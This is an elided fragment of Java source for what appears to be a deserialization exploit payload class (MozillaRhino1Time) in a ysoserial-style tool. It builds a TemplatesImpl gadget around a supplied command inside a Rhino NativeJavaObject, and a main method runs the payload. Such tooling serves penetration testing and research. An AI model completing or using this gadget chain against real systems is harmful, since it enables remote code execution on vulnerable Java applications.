...
public class MozillaRhino1Time implements ObjectPayload<Object> {
    ...
    public Object getObject(final String command) throws Exception {
        ...
        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImplTime(command), TemplatesImpl.class);
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino1Time.class, args);
    }
